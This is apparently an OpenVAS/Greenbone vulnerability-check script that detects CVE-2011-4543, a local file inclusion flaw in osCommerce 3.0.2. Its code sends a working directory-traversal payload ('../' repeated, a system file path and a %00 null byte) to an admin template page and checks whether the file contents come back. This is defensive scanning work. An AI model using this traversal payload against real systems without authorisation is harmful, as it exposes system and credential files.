CPE = "cpe:/a:oscommerce:oscommerce";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103345" );
	script_version( "2021-07-20T10:07:38+0000" );
	script_tag( name: "last_modification", value: "2021-07-20 10:07:38 +0000 (Tue, 20 Jul 2021)" );
	script_tag( name: "creation_date", value: "2011-11-24 09:57:26 +0100 (Thu, 24 Nov 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2011-4543" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "osCommerce Multiple Local File Include Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_oscommerce_http_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "oscommerce/http/detected" );
	script_require_ports( "Services/www", 443 );
	script_tag( name: "summary", value: "osCommerce is prone to multiple local file-include
  vulnerabilities because it fails to properly sanitize user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver
  process. This may allow the attacker to compromise the application and the computer. Other
  attacks are also possible." );
	script_tag( name: "affected", value: "osCommerce 3.0.2 is vulnerable. Prior versions may also be affected." );
	script_tag( name: "solution", value: "Update to the latest version." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50793" );
	script_xref( name: "URL", value: "https://www.dognaedis.com/vulns/DGS-SEC-4.html" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/OM/Core/Site/Admin/Application/templates_modules/pages/info.php?set=" + crap( data: "../", length: 12 * 3 ) + files[file] + "%00&module=foo";
	if(http_vuln_check( port: port, url: url, pattern: file )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

